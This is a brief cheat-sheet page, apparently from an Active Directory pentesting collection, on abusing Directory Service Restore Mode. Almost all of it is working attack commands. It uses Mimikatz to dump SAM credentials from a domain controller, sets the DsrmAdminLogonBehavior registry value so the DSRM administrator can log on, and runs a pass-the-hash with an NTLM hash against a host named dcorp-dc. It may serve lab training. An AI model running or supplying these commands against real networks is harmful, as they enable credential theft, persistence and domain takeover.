---
layout: page
title: "# Abuse DSRM (Directory Service Restore Mode)"
permalink: /ad_cheatsheets/abuse_dsrm
---

# Abuse DSRM (Directory Service Restore Mode)

## Extract Creds From SAM From DC

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

## Modify the Register (to be able to login)

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

## Pass The Hash DSRM Administrator

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd  /run:powershell.exe"'
```
